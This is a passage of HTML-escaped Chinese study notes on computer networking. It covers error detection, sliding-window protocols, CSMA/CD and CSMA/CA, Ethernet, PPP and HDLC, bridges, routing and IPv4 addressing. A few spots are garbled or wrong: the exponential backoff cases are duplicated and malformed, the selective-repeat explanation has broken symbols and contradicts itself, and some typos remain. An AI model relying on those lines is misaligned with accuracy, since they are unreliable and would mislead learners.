奇校验：添加一位校验码后，使得整个码字里面1的个数是奇数。接收端收到数据后就校验数据里1的个数，若检测到奇数个1，则认为传输没有出错；若检测到偶数个1，则说明传输过程中，数据发生了改变，要求重发&lt;br&gt;
偶校验：添加一位校验码后，使得整个码字里面1的个数是偶数。接收端收到数据后就校验数据里1的个数，若检测到偶数个1，则认为传输没有出错；若检测到奇数个1，则说明传输过程中，数据发生了改变，要求重发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;循环冗余码&lt;br&gt;
学会二进制除法即可
&lt;img src=&#34;https://xuoneyuan.github.io/images/jw-1.png&#34; alt=&#34;crc&#34; title=&#34;示例&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;纠错编码&#34;&gt;纠错编码&lt;/h4&gt;
&lt;p&gt;海明码：在信息字段中插入若干位数据用于监督码字里的哪一位数据发生了变化，具有一位纠错能力&lt;/p&gt;
&lt;p&gt;具体求解步骤如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确定校验码的位数r&lt;/li&gt;
&lt;li&gt;确定校验码的位置&lt;/li&gt;
&lt;li&gt;确定数据的位置&lt;/li&gt;
&lt;li&gt;求出校验位的值&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;流量控制与可靠传输机制&#34;&gt;流量控制与可靠传输机制&lt;/h3&gt;
&lt;h4 id=&#34;流量控制&#34;&gt;流量控制&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;停止-等待流量控制&lt;br&gt;
发送方发出一帧，然后等待应答信号到达再发送下一帧；接收方每收到一帧后，返回一个应答信号，表示可以接收下一帧&lt;/li&gt;
&lt;li&gt;滑动窗口流量控制&lt;br&gt;
在任意时刻，发送方都维持了一组连续的允许发送的帧序号，称为发送窗口。同时接收方也维持了一组连续的允许接收的帧的序号，称为接收窗口。发送窗口和接收窗口的序号的上下界不一定要一样，甚至大小也可以不同。发送方窗口内的序列号代表了已经被发送但是还没有被确认的帧，或者是可以被发送的帧。发送端每收到一个帧的确认，发送窗口就向前滑动一个帧的位置。当发送窗口尺寸达到最大尺寸时，发送方会强行关闭网络层，直到出现一个空闲缓冲区。在接收端只有当收到的数据帧的发送序号落入接收窗口内才允许将该数据帧收下，并将窗口前移一个位置。若接收到的数据帧落在接收窗口之外，则一律将其丢弃。
&lt;img src=&#34;https://xuoneyuan.github.io/images/jw-2.png&#34; alt=&#34;slide&#34; title=&#34;滑动窗口流量控制的发送窗口&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;可靠传输机制&#34;&gt;可靠传输机制&lt;/h4&gt;
&lt;p&gt;总结可靠传输与无差错接收的区别&lt;br&gt;
解析：在数据链路层若仅仅使用了循环冗余码检验差错检测技术，只能做到对帧的无差错接收，接收端虽然收到了帧，但最终还是因为有差错被丢弃，即没有被接收&lt;/p&gt;
&lt;h4 id=&#34;滑动窗口机制&#34;&gt;滑动窗口机制&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;只有在接收窗口向前滑动时，发送窗口才有可能向前滑动&lt;/li&gt;
&lt;li&gt;可靠传输机制包括3种协议只是在发送窗口和接收窗口大小上有所差别&lt;br&gt;
停止-等待协议：发送窗口大小=1，接收窗口大小=1&lt;br&gt;
后退N帧协议：发送窗口大小&amp;gt;1，接收窗口大小=1&lt;br&gt;
选择重传协议：发送窗口大小&amp;gt;1，接收窗口大小&amp;gt;1&lt;/li&gt;
&lt;li&gt;当接收窗口的大小为1时，一定可保证帧按序接收&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;停止-等待协议&#34;&gt;停止-等待协议&lt;/h4&gt;
&lt;p&gt;基本思想：发送方传输一个帧后，必须等待对方的确认才能发送下一帧。若在规定时间内没有收到确认，则发送方超时，并重传原始帧&lt;/p&gt;
&lt;p&gt;出现的差错主要有以下两类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一类错误就是数据帧被损坏或者丢失 &lt;br&gt;
处理数据帧被损坏的情况时，使用计时器即可解决。发送方在发送一个帧后，若数据能够被正确地接收到，则接收方就发送一个确认帧；若接收方收到的是一个被损坏的数据帧，则直接丢弃，只要计时器超过了发送方就会重新发送该数据帧，重复直至数据帧无错误地到达接收方为止&lt;/li&gt;
&lt;li&gt;第二类错误是确认帧被破坏或者丢失&lt;br&gt;
解决方法就是让发送方在每个待发的帧头部加一个编号，而接收方对每个到达的帧的编号进行识别，判断是新帧还是要抛弃的重复帧&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;后退n帧gbn协议&#34;&gt;后退N帧(GBN)协议&lt;/h4&gt;
&lt;p&gt;基本原理：发送方发送完一个数据帧后，不是停下来等待确认帧，而是可以连续再发送若干个数据帧，如果这时收到了接收方的确认帧，那么还可以接着发送数据帧。如果某个帧出错了，接收方只能简单地丢弃该帧及其所有的后续帧。发送方超时后需要重发该出错帧及其后续的所有帧



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;为什么后退N帧协议的发送窗口尺寸W,必须满足1&amp;lt;W≤2&lt;sup&gt;n&lt;/sup&gt;-1?&lt;/p&gt;
&lt;p&gt;解析:假设发送窗口的大小为2&lt;sup&gt;n&lt;/sup&gt;,发送方发送了0号帧,接收窗口发送ACKI（0号帧已收到，希望接收1号帧，但是ACK1丢失)，接着发送方发送了1号帧，接收窗口发送ACK2(1号帧已收到，希望接收2号帧，但是 ACK2丢失)，以此类推，直到发送方发了第2&lt;sup&gt;n&lt;/sup&gt;-1号帧，接收方发送 ACK2&lt;sup&gt;n&lt;/sup&gt;(丢失)，此时不能再发送数据了，因为已经发送了2个帧，但一个确认都没有收到，所以一段时间后0号帧的计时器会到达预定时间进行重发，此时接收方认为发过来的是新一轮的0号帧还是旧一轮的重传呢?接收方并不知道，很有可能接收方就把该0号帧当作新一轮的帧接收了，但实际上这个0号帧是重传的，所以出现了错误，即发送窗口的大小不可能为2&lt;sup&gt;n&lt;/sup&gt;。现在假设发送窗口的大小为2&lt;sup&gt;n&lt;/sup&gt;-1，情况和上面一样，发送方发送了0~2&lt;sup&gt;n&lt;/sup&gt;-2号帧，接收方发送的确认帧都丢失了，如果没有丢失就应该接着传2&lt;sup&gt;n&lt;/sup&gt;-1号帧，但是丢失了，发送方应该发送0号帧。由于这种情况接收方可以判断出来(下一帧只要不是第2&lt;sup&gt;n&lt;/sup&gt;1号帧就是重传），因此不会发生错误。如果发送窗口尺寸小于2&lt;sup&gt;n&lt;/sup&gt;-1，那就更不会发生错误了。&lt;br&gt;
综上所述，后退N帧协议的最大发送窗口是2&lt;sup&gt;n&lt;/sup&gt;-1&lt;/p&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;h4 id=&#34;选择重传sr协议&#34;&gt;选择重传(SR)协议&lt;/h4&gt;
&lt;p&gt;基本思想：若一帧出错，则其后续帧先存入接收方的缓冲区中，同时要求发送方重传出错帧，一旦收到重传帧后，就和原先存在缓冲区的其余帧一起按正确的顺序送至主机



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;为什么选择重传协议的最大发送窗口的大小是2&lt;sup&gt;n-1&lt;/sup&gt;?&lt;br&gt;
解析:现在先假设选择重传协议的最大发送窗口是W,那么可以一次性发送0~W-1号帧，并且接收方都已经接收到了，但是这W个确认帧全部都在传输的过程中丢失了，此时接收窗口的位置已经移动到W~2W-1。如果发送方再发一轮，这W个帧应该落在W～2W-1，但是此时的W帧是重传的，所以若要正确，就必须满足2W-1是在最大序号2&lt;sup&gt;n&lt;/sup&gt;-1之内，也就是说2W-1≤2&lt;sup&gt;n&lt;/sup&gt;-1，即W&amp;lt;2&lt;sup&gt;n-1&lt;/sup&gt;。综上所述，选择重传协议的最大发送窗口是2&lt;sup&gt;n-1&lt;/sup&gt;。&lt;/li&gt;
&lt;li&gt;假设n=3，2-=4，若发送窗口为5，则接收窗口为5。假设t时刻发送方发送序号为0~4的帧，t时刻接收方接收到序号为0~4的帧，接收窗口滑动到[5,6,7,0,1]，并发送0~4号的确认帧。但是确认帧在传输中都丢失了。于是，发送方在t3时刻重发帧0。当t时刻接收方收到帧0时，由于帧0在其接收范围，0被错误地当作新帧接收，导致协议错误。因此，对于选择重传协议，必须使发送窗口的大小小于或等于2&lt;sup&gt;n-1&lt;/sup&gt;。&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;介质访问控制&#34;&gt;介质访问控制&lt;/h3&gt;
&lt;h4 id=&#34;介质访问控制分类&#34;&gt;介质访问控制分类&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;信道划分&lt;/li&gt;
&lt;li&gt;随机访问&lt;/li&gt;
&lt;li&gt;轮询访问
1是静态分配信道的方法，2、3是动态分配信道的方法&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;信道划分介质访问控制&#34;&gt;信道划分介质访问控制&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;频分多路复用&lt;/li&gt;
&lt;li&gt;时分多路复用&lt;/li&gt;
&lt;li&gt;波分多路复用&lt;/li&gt;
&lt;li&gt;码分多路复用&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;随机访问介质访问控制&#34;&gt;随机访问介质访问控制&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;ALOHA协议&lt;br&gt;
当网络中的任何一个节点需要发送数据时，可以不进行任何检测就发送数据。如果在一段时间内没有收到确认，该节点就认为传输过程中发生了冲突。发生冲突的节点需要等待一段随机时间后再发送数据，直至发送成功为止。&lt;/li&gt;
&lt;li&gt;CSMA协议&lt;br&gt;
载波侦听多路访问（CSMA）协议是在 ALOHA 协议的基础上改进而来的一种多路访问控制协议。在CSMA中，每个节点发送数据之前都使用载波侦听技术来判定通信信道是否空闲。常用的CSMA有以下3种策略。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;1-坚持 CSMA:当发送节点监听到信道空闲时，立即发送数据，否则继续监听。&lt;/li&gt;
&lt;li&gt;p-坚持 CSMA:当发送节点监听到信道空闲时，以概率p发送数据，以概率1-p延迟一段时间并重新监听。&lt;/li&gt;
&lt;li&gt;非坚持CSMA:当发送节点一旦监听到信道空闲时，立即发送数据，否则延迟一段随机的时间再重新监听。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;CSMA/CD协议&lt;br&gt;
CSMA/CD全称为带冲突检测的载波侦听多路访问协议，它是在局域网中被广泛应用的介质访问控制协议。&lt;br&gt;
CSMA/CD 工作流程:每个站在发送数据之前要先检测一下总线上是否有其他计算机在发送数据，若有，则暂时不发送数据，以免发生冲突;若没有，则发送数据。计算机在发送数据的同时检测信道上是否有冲突发生，若有，则采用截断二进制指数类型退避算法来等待一段随机时间后再次重发。总体来说，可概括为“先听后发，边听边发，冲突停发，随机重发”。



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;在二进制指数后退算法中，N次碰撞之后，站点会在0~M之间选择一个随机数，分以下3类情况讨论。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当1≤N≤10时，M=2N-1&lt;/li&gt;
&lt;li&gt;当1≤N≤10时，M=2N-1&lt;/li&gt;
&lt;li&gt;当N=16时，直接丢弃，并给计算机发送一个错误报告&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注意:二进制指数后退算法解决了站点检测到冲突后继续等待的时间问题&lt;/p&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CSMA/CA协议&lt;br&gt;
CSMA/CA主要用在无线局域网中，由IEEE 802.11标准定义，它在 CSMA 的基础上增加了冲突避免的功能。冲突避免要求每个节点在发送数据之前监听信道。如果信道空闲，则发送数据。发送节点在发送完一个帧后，必须等待一段时间(称为帧间间隔)，检查接收方是否发回帧的确认。若收到确认，则表明无冲突发生;若在规定时间内没有收到确认，表明出现冲突，重发该帧。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;局域网&#34;&gt;局域网&lt;/h3&gt;
&lt;h4 id=&#34;局域网的基本概念与体系结构&#34;&gt;局域网的基本概念与体系结构&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;局域网最主要的特点&lt;/li&gt;
&lt;li&gt;局域网的主要优点&lt;/li&gt;
&lt;li&gt;局域网的主要技术要素&lt;/li&gt;
&lt;li&gt;局域网的主要拓扑结构&lt;/li&gt;
&lt;li&gt;局域网的主要传输介质&lt;/li&gt;
&lt;li&gt;局域网的主要介质访问控制方法&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;以太网的工作原理&#34;&gt;以太网的工作原理&lt;/h4&gt;
&lt;p&gt;以太网采用总线拓扑结构，所有计算机都共享一条总线，信息以广播方式发送。为了保证数据通信的方便性和可靠性，以太网使用了CSMA/CD技术对总线进行访问控制。考虑到局域网信道质量好，以太网采取了以下两项重要的措施以使通信更加简便&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;采用无连接的工作方式&lt;/li&gt;
&lt;li&gt;不对发送的数据帧进行编号，也不要求对发送方发送确认&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因此以太网提供的服务是不可靠的服务,即尽最大努力交付,差错的纠正由传输层的TCP完成&lt;/p&gt;
&lt;h4 id=&#34;以太网的mac帧&#34;&gt;以太网的MAC帧&lt;/h4&gt;
&lt;p&gt;局域网中的每台计算机都有一个唯一的号码，称为MAC 地址或物理地址、硬件地址。每块网卡出厂即被赋予一个全球唯一的MAC地址,它被固化在网卡的ROM中,共48bit(6B)&lt;/p&gt;
&lt;h4 id=&#34;以太网的传输介质&#34;&gt;以太网的传输介质&lt;/h4&gt;
&lt;p&gt;传统以太网可使用的传输介质有4种，即粗缆、细缆、双绞线和光纤。对应的，MAC层下面给出了这4种传输介质的物理层，即10Base5（粗缆)、10Base2(细缆)、10Base-T(双绞线）和10Base-F(光纤)。其中，Base是指电缆上的信号为基带信号，采用曼彻斯特编码;Base前面的10表示数据传输速率为10Mbit/s;Base后面的5或2表示每一段电缆最长为500m或200m(实为185m);T表示双绞线，F表示光纤。&lt;/p&gt;



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;以太网的MAC协议提供的是无连接不可靠服务&lt;br&gt;
有连接与无连接的判断:MAC 帧首部格式中只有目的 MAC 地址、源MAC地址和类型字段，并没有建立连接的字段，所以以太网MAC协议提供的是无连接的服务&lt;br&gt;
可靠与不可靠的判断:以太网帧是一种无编号的帧，当目的站收到有差错的数据帧时，就丢弃此帧，其他什么也不做，差错的纠正由高层来决定，所以以太网的MAC 协议是不可靠的&lt;/p&gt;&lt;/div&gt;

&lt;h3 id=&#34;广域网&#34;&gt;广域网&lt;/h3&gt;
&lt;h4 id=&#34;广域网的基本概念&#34;&gt;广域网的基本概念&lt;/h4&gt;



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;从层次上考虑，广域网和局域网的区别很大，局域网使用的协议主要在数据链路层，而广域网使用的协议主要在网络层&lt;/p&gt;
&lt;p&gt;广域网中存在一个最重要的问题，即路由选择和分组转发。路由选择协议负责搜索分组从某个节点到目的节点的最佳传输路由，以便构造路由表。从路由表再构造出转发分组的转发表，分组是通过转发表进行转发的&lt;/p&gt;&lt;/div&gt;

&lt;h4 id=&#34;ppp&#34;&gt;PPP&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;PPP是一个面向字节的协议&lt;/li&gt;
&lt;li&gt;PPP不需要的功能:纠错（PPP只负责检错)、流量控制（由TCP负责)、序号(PPP是不可靠传输协议，所以不需要对帧进行编号)、多点线路(PPP是点对点的通信方式)、半双工或单工（PPP只支持全双工链路）&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;hdlc协议&#34;&gt;HDLC协议&lt;/h4&gt;
&lt;p&gt;高级数据链路控制（HDLC）协议是ISO制定的面向比特(PPP是面向字节的，这个要记住）的数据链路控制协议。它可适用于链路的两种基本配置:非平衡配置和平衡配置



&lt;div class=&#34;notice notice-tip&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;PPP的帧格式和 HDLC协议的帧格式的区别&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PPP是面向字节的，而HDLC 协议是面向比特的。可以看出，PPP应该使用字节填充，而HDLC协议应该使用比特填充&lt;/li&gt;
&lt;li&gt;PPP帧比HDLC 协议帧多一个2字节的协议字段。当协议字段值为0x0021时,表示信息字段是护数据报&lt;/li&gt;
&lt;li&gt;PPP不使用序号和确认机制，只保证无差错接收（通过硬件进行循环冗余码校验)，而端到端差错检测由高层协议完成。HDLC 协议的信息帧使用了编号和确认机制&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;数据链路层设备&#34;&gt;数据链路层设备&lt;/h3&gt;
&lt;h4 id=&#34;网桥的概念和基本原理&#34;&gt;网桥的概念和基本原理&lt;/h4&gt;
&lt;p&gt;在数据链路层扩展局域网使用的是网桥。网桥工作在数据链路层，其特点是具有过滤帧的功能。网桥至少有两个端口，每个端口与一个网段相连。网桥每从一个端口接收到一个帧，就先暂存到缓存中。若该帧未出现差错，且欲发往的目的站MAC地址属于另一个网段（同一个网段无需转发，应该丢弃)，则通过查找转发表，将该帧从对应的端口发出。因此，仅在同一个网段中通信的帧，不会被网桥转发到另一个网段中，因而不会加重整个网络的负担。&lt;/p&gt;
&lt;h4 id=&#34;以太网交换机及其工作原理&#34;&gt;以太网交换机及其工作原理&lt;/h4&gt;
&lt;p&gt;以太网交换机实质上是多端口网桥，它工作在数据链路层。以太网交换机的每个端口都直接与主机或集线器相连，并且一般都工作在全双工方式。当主机需要通信时，交换机能同时连通许多对的端口，使每一对相互通信的主机都能像独占通信媒体那样，进行无冲突地传输数据，通信完成后断开连接。&lt;/p&gt;
&lt;h4 id=&#34;各层设备的广播域冲突域及总结&#34;&gt;各层设备的广播域、冲突域及总结&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;设备名称&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;隔离冲突域&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;隔离广播域&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;集线器&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;中继器&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;交换机&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;✔️&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;网桥&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;✔️&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;路由器&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;✔️&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;✔️&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;网络层&#34;&gt;网络层&lt;/h2&gt;
&lt;h3 id=&#34;网络层的功能&#34;&gt;网络层的功能&lt;/h3&gt;
&lt;h4 id=&#34;异构网络互连&#34;&gt;异构网络互连&lt;/h4&gt;
&lt;p&gt;将网络互联起来需要一些中间设备，根据中继系统所在的层次，有以下4种不同的中继系统。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;物理层：中继器或集线器&lt;/li&gt;
&lt;li&gt;数据链路层：网桥或交换机&lt;/li&gt;
&lt;li&gt;网络层：路由器&lt;/li&gt;
&lt;li&gt;网络层以上：网关&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;路由与转发&#34;&gt;路由与转发&lt;/h4&gt;
&lt;p&gt;路由器的主要功能包括路由选择（确定哪一条路径）与分组转发(当一个分组到达时所采用的动作)。根据所需性能要求，可以采用适当的路由算法来构造路由表进行路由选择。不仅如此，该路由表还会根据从各相邻路由器所得到的关于整个网络的拓扑变化情况，动态地改变所选择的路由，以便得到最佳路由&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;路由选择:根据路由算法确定一个进来的分组应该被传送到哪一条输出路线上。如果子网内部使用数据报，那么对每一个进来的分组都要重新选择路径。如果子网内部使用虚电路，那么只有当创建一个新的虚电路时，才需要确定路由路径&lt;/li&gt;
&lt;li&gt;分组转发:路由器根据转发表将用户的IP数据报从合适的端口转发出去&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注意:路由表是根据路由选择算法得出的，而转发表是从路由表得出的&lt;/p&gt;
&lt;h4 id=&#34;拥塞控制&#34;&gt;拥塞控制&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;开环控制&lt;/li&gt;
&lt;li&gt;闭环控制&lt;/li&gt;
&lt;/ol&gt;



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;注意:拥塞控制和流量控制的关系密切，但二者之间也存在一些差异。拥塞控制必须确保通信子网能够传送待传送的数据，是一个全局性的问题，涉及所有主机、路由器以及导致网络传输能力下降的所有因素。而流量控制只与给定的发送端和接收端之间的点对点通信量有关，其任务是使发送端发送数据的速率不能快得让接收端来不及接收&lt;/p&gt;&lt;/div&gt;

&lt;h3 id=&#34;路由算法&#34;&gt;路由算法&lt;/h3&gt;
&lt;h4 id=&#34;静态路由与动态路由&#34;&gt;静态路由与动态路由&lt;/h4&gt;
&lt;p&gt;静态路由特点是简单和开销小，但不能及时适应网络状态的变化&lt;br&gt;
动态路由特点是较好地适应网络状态的变化，分为两种基本类型：距离-向量路由算法和链路状态路由算法&lt;/p&gt;
&lt;h4 id=&#34;距离-向量路由算法&#34;&gt;距离-向量路由算法&lt;/h4&gt;
&lt;p&gt;在距离-向量路由算法中，所有的节点都定期地将它们整个路由选择表传送给所有与之直接相邻的节点。这种路由选择表包含每条路径的目的地（另一节点）和路径的代价（距离)&lt;/p&gt;
&lt;h4 id=&#34;链路状态路由算法&#34;&gt;链路状态路由算法&lt;/h4&gt;
&lt;p&gt;链路状态路由算法要求每个参与该算法的节点都有完全的网络拓扑信息，它们执行下述两项任务&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;主动测试所有邻接节点的状态，两个共享一条链接的节点是相邻节点，它们连接到同一条链路&lt;/li&gt;
&lt;li&gt;定期地将链路状态传播给所有其他节点（或称为路由节点)&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;层次路由&#34;&gt;层次路由&lt;/h4&gt;
&lt;p&gt;因特网将整个互联网划分为许多较小的自治系统，每个自治系统有权自主地决定本系统内应采用何种路由选择协议&lt;br&gt;
因特网把路由选择协议分为两大类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个自治系统内部所使用的路由选择协议称为内部网关协议（IGP)，具体的协议有RIP和OSPF等&lt;/li&gt;
&lt;li&gt;自治系统之间使用的路由选择协议称为外部网关协议（EGP)，主要在不同自治系统的路由器之间交换路由信息，并负责为分组在不同自治系统之间选择最优的路径，具体的协议有BGP&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ipv4&#34;&gt;IPv4&lt;/h3&gt;
&lt;h4 id=&#34;ipv4分组&#34;&gt;IPv4分组&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/ipv4.png&#34; alt=&#34;ip&#34; title=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;ipv4地址&#34;&gt;IPv4地址&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;IPv4地址的分类&lt;br&gt;
A类地址：网络号为前面8位，第一位规定为0，每个A类网络上的最大主机是2&lt;sup&gt;24&lt;/sup&gt;-2&lt;br&gt;
B类地址：网络号为前面16位，前两位规定为10，每个B类网络上的最大主机是2&lt;sup&gt;16&lt;/sup&gt;-2&lt;br&gt;
C类地址：网络号为前面24位，前三位规定为110，每个C类网络上的最大主机是2&lt;sup&gt;8&lt;/sup&gt;-2&lt;/li&gt;
&lt;li&gt;6种特殊地址
&lt;img src=&#34;https://xuoneyuan.github.io/images/6-ipv4.png&#34; alt=&#34;ip&#34; title=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;nat&#34;&gt;NAT&lt;/h4&gt;
&lt;p&gt;NAT 就是将专用网内部使用的本地IP地址转换成有效的外部全球IP地址，使得整个专用网只需要一个全球IP地址就可以与因特网连通&lt;/p&gt;
&lt;h4 id=&#34;子网划分与子网掩码&#34;&gt;子网划分与子网掩码&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;子网划分&lt;br&gt;
划分子网的基本思路:从主机号借用若干个比特作为子网号，而主机号也就相应减少了若干个比特，网络号不变。于是三级的IP地址可记为&lt;br&gt;
IP地址::={&amp;lt;网络号&amp;gt;，&amp;lt;子网号&amp;gt;，&amp;lt;主机号&amp;gt;}&lt;/li&gt;
&lt;/ol&gt;



&lt;div class=&#34;notice notice-note&#34; &gt;
